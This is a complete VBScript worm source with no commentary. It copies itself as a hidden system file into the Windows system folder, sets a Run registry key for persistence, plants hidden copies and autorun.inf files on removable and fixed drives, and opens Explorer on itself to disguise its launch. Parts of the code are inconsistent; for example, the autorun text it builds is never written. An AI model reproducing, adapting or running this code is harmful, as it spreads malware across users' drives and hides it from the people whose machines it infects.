On Error Resume Next
dim rekur,syspath,windowpath,desades,longka,mf,isi,tf,rieysha,nt,check,sd
isi = "[autorun]" & vbcrlf & "shellexecute=wscript.exe hilangnya keperawananku.sys.vbs"
set longka = createobject("Scripting.FileSystemObject")
set mf = longka.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text = mf.openastextstream(1,-2)
do while not text.atendofstream
rekur = rekur & text.readline
rekur = rekur & vbcrlf
loop
do
Set windowpath = longka.getspecialfolder(0)
Set syspath = longka.getspecialfolder(1)
set tf = longka.getfile(syspath & "\recycle.vbs")
tf.attributes = 32
set tf = longka.createtextfile(syspath & "\recycle.vbs",2,true)
tf.write rekur
tf.close
set tf = longka.getfile(syspath & "\recycle.vbs")
tf.attributes = 39
for each desades in longka.drives
If (desades.drivetype = 1 or desades.drivetype = 2) and desades.path <> "A:" then
set tf=longka.getfile(desades.path &"\rieysha.sys.vbs")
set tf=longka.createtextfile(desades.path &"\ keperawananku.sys.vbs",2,true)
tf.write rekur
tf.close
set tf=longka.getfile(desades.path &"\ keperawananku.sys.vbs")
tf.attributes = 39
set tf =longka.getfile(desades.path &"\autorun.inf")
tf.attributes = 32
set tf=longka.createtextfile(desades.path &"\autorun.inf",2,true)
tf.close
set tf = longka.getfile(desades.path &"\autorun.inf")
tf.attributes=39
end if
next
set rieysha = createobject("WScript.Shell")
rieysha.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Ageia", syspath & "\recycle.vbs"
if check <> 1 then
Wscript.sleep 200000
end if
loop while check <> 1
set sd = createobject("Wscript.shell")
sd.run windowpath & "\explorer.exe /e,/select, " & Wscript.ScriptFullname
